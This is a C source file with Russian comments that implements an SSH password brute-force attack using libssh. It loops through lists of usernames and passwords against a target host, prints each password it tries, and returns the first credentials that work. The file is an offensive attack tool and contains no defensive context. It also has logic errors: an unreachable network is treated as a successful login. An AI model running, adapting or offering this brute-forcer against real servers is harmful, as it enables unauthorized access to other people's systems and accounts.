#include "include/includes.h"

typedef struct {
    char username[128];
    char password[128];
    int good;
} Credentials;

int try_login(const char *host, const char *user, const char *password) {
    ssh_session session = ssh_new();
    if (session == NULL) {
        fprintf(stderr, "Error: Unable to create SSH session\n");
        return -1;
    }

    ssh_options_set(session, SSH_OPTIONS_HOSTKEYS, "ssh-ed25519,ecdsa-sha2-nistp256,ecdsa-sha2-nistp384,ecdsa-sha2-nistp521,ssh-rsa,rsa-sha2-512,rsa-sha2-256,ssh-dss");
    // Устанавливаем все возможные методы обмена ключами (key exchange)
    ssh_options_set(session, SSH_OPTIONS_KEY_EXCHANGE, "curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group-exchange-sha256,diffie-hellman-group16-sha512,diffie-hellman-group18-sha512,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1");
    // Устанавливаем все возможные методы шифрования
    ssh_options_set(session, SSH_OPTIONS_CIPHERS_C_S, "chacha20-poly1305@openssh.com,aes128-ctr,aes192-ctr,aes256-ctr,aes128-gcm@openssh.com,aes256-gcm@openssh.com");
    ssh_options_set(session, SSH_OPTIONS_CIPHERS_S_C, "chacha20-poly1305@openssh.com,aes128-ctr,aes192-ctr,aes256-ctr,aes128-gcm@openssh.com,aes256-gcm@openssh.com");
    // Устанавливаем все возможные методы проверки целостности (MAC)
    ssh_options_set(session, SSH_OPTIONS_HMAC_C_S, "umac-64-etm@openssh.com,umac-128-etm@openssh.com,hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,umac-64@openssh.com,umac-128@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1");
    ssh_options_set(session, SSH_OPTIONS_HMAC_S_C, "umac-64-etm@openssh.com,umac-128-etm@openssh.com,hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,umac-64@openssh.com,umac-128@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1");
    ssh_options_set(session, SSH_OPTIONS_HOST, host);
    ssh_options_set(session, SSH_OPTIONS_USER, user);

    printf("Connecting to %s as %s...\n", host, user);
    int connection_result = ssh_connect(session);
    
    if (connection_result != SSH_OK) {
        // Проверяем, является ли ошибка "Network is unreachable"
        if (strcmp(ssh_get_error(session), "Network is unreachable") == 0) {
            fprintf(stderr, "Connection failed: Network is unreachable\n");
            ssh_free(session);
            return 0; // Возвращаем 0, если сеть недоступна
        }
        fprintf(stderr, "Error: %s\n", ssh_get_error(session));
        ssh_free(session);
        return -1;
    }

    printf("Trying password: %s\n", password);
    int rc = ssh_userauth_password(session, NULL, password);
    if (rc == SSH_AUTH_SUCCESS) {
        printf("Password found: %s\n", password);
        ssh_disconnect(session); // Разрываем соединение при успешном входе
        ssh_free(session);
        return 0; // Успех
    } else {
        printf("Failed password: %s\n", password);
        ssh_disconnect(session); // Разрываем соединение при неудаче
        ssh_free(session);
        return -1; // Неудача
    }
}

Credentials ssh_brute(char *host) {
    Credentials credentials = { .username = "", .password = "", .good = 0 }; // Инициализация пустыми строками
    int shutup_ssh_bruteforce = 0;

    for (int b = 0; usernames[b] != NULL; b++) {
        for (int i = 0; passwords[i] != NULL; i++) {
            if (try_login(host, usernames[b], passwords[i]) == 0) {
                // Если пароль найден, сохраняем учетные данные
                strncpy(credentials.username, usernames[b], sizeof(credentials.username) - 1);
                strncpy(credentials.password, passwords[i], sizeof(credentials.password) - 1);
                credentials.username[sizeof(credentials.username) - 1] = '\0'; // Обеспечиваем нуль-терминацию
                credentials.password[sizeof(credentials.password) - 1] = '\0'; // Обеспечиваем нуль-терминацию
                credentials.good = 1;
                shutup_ssh_bruteforce = 20;
                break; // Если пароль найден, выходим из цикла
            }
        }

        if (shutup_ssh_bruteforce == 20) {
            break; // Выходим из внешнего цикла, если пароль найден
        }
    }

    if (credentials.username == usernames[0] && credentials.password == passwords[0]) {
        credentials.good = 0;
    }

    return credentials; // Возвращаем найденные учетные данные
}